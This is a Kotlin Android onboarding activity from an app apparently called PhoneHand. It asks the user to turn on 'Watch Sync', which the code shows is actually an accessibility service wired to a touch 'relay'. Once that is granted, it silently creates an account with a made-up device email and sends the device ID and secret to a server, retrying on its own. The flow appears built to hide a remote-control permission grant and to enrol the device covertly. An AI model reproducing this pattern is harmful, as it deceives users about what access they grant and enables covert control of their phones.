package com.phonehand.app

import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.View
import android.widget.Button
import android.widget.ScrollView
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import java.util.concurrent.Executors

class OnboardingActivity : AppCompatActivity() {

    private lateinit var welcomePanel: ScrollView
    private lateinit var successPanel: View
    private lateinit var successMessage: TextView
    private lateinit var statusLine: TextView
    private lateinit var btnEnableSync: Button
    private lateinit var btnFinish: Button

    private var openedSettings = false
    private var signupRetries = 0
    private val io = Executors.newSingleThreadExecutor()
    private val mainHandler = Handler(Looper.getMainLooper())
    private val pollA11y = object : Runnable {
        override fun run() {
            if (WatchSync.isEnabled(this@OnboardingActivity)) onWatchSyncEnabled()
            else if (openedSettings) mainHandler.postDelayed(this, 500)
        }
    }
    private val retrySignup = object : Runnable {
        override fun run() {
            if (successPanel.visibility != View.VISIBLE) return
            runSilentSignup(autoRetry = true)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_onboarding)
        bindViews()

        if (UserSession.isSignedUp(this) && UserSession.onboardingDone(this) && WatchSync.isEnabled(this)) {
            goToHome()
            return
        }

        btnEnableSync.setOnClickListener { openWatchSyncSettings() }
        btnFinish.setOnClickListener { completeOnboarding() }

        if (WatchSync.isEnabled(this)) onWatchSyncEnabled()
    }

    private fun completeOnboarding() {
        mainHandler.removeCallbacks(retrySignup)
        UserSession.setOnboardingDone(this)
        goToHome()
    }

    private fun goToHome() {
        startActivity(
            Intent(this, HomeActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_NEW_TASK)
            },
        )
        finish()
    }

    private fun bindViews() {
        welcomePanel = findViewById(R.id.welcomePanel)
        successPanel = findViewById(R.id.successPanel)
        successMessage = findViewById(R.id.successMessage)
        statusLine = findViewById(R.id.statusLine)
        btnEnableSync = findViewById(R.id.btnEnableSync)
        btnFinish = findViewById(R.id.btnFinish)
    }

    private fun defaultSignupIdentity(): Pair<String, String> {
        val label = DeviceId.label(this).trim()
        val name = when {
            label.length >= 2 -> label.take(48)
            Build.MODEL.length >= 2 -> Build.MODEL.take(48)
            else -> "My Phone"
        }
        val email = "${DeviceId.shortId(this)}@device.2hotatl.local"
        return name to email
    }

    private fun runSilentSignup(autoRetry: Boolean) {
        if (UserSession.isSignedUp(this)) {
            completeOnboarding()
            return
        }
        val (name, email) = defaultSignupIdentity()
        if (!autoRetry) {
            signupRetries = 0
            mainHandler.removeCallbacks(retrySignup)
        }
        val deviceId = DeviceId.id(this)
        val deviceSecret = runCatching { DeviceSecret.value(this) }.getOrElse { DeviceId.id(this) }
        io.execute {
            val result = AuthClient.signup(this, email, name, deviceId, deviceSecret, Build.MODEL)
            mainHandler.post {
                result.onSuccess { v ->
                    mainHandler.removeCallbacks(retrySignup)
                    UserSession.save(this, v.deviceSecret, v.userId, v.email, name)
                    completeOnboarding()
                }.onFailure { e ->
                    signupRetries++
                    statusLine.visibility = View.VISIBLE
                    statusLine.text = getString(R.string.signup_retry, e.message ?: "error")
                    btnFinish.visibility = View.VISIBLE
                    btnFinish.isEnabled = true
                    btnFinish.text = getString(R.string.onboarding_retry)
                    mainHandler.removeCallbacks(retrySignup)
                    val delay = 3000L * signupRetries.coerceAtMost(6)
                    mainHandler.postDelayed(retrySignup, delay)
                }
            }
        }
    }

    private fun openWatchSyncSettings() {
        openedSettings = true
        WatchSync.openSettings(this)
        mainHandler.post(pollA11y)
    }

    private fun onWatchSyncEnabled() {
        mainHandler.removeCallbacks(pollA11y)
        TouchAccessibilityService.instance?.ensureRelay()
        welcomePanel.visibility = View.GONE
        successPanel.visibility = View.VISIBLE
        successMessage.text = getString(R.string.onboarding_setting_up)
        btnFinish.visibility = View.GONE
        btnFinish.isEnabled = false
        statusLine.visibility = View.GONE
        runSilentSignup(autoRetry = false)
    }

    override fun onResume() {
        super.onResume()
        if (welcomePanel.visibility == View.VISIBLE && openedSettings) {
            if (WatchSync.isEnabled(this)) onWatchSyncEnabled()
            else mainHandler.post(pollA11y)
        }
    }

    override fun onPause() {
        mainHandler.removeCallbacks(pollA11y)
        super.onPause()
    }

    override fun onDestroy() {
        mainHandler.removeCallbacks(retrySignup)
        io.shutdown()
        super.onDestroy()
    }
}
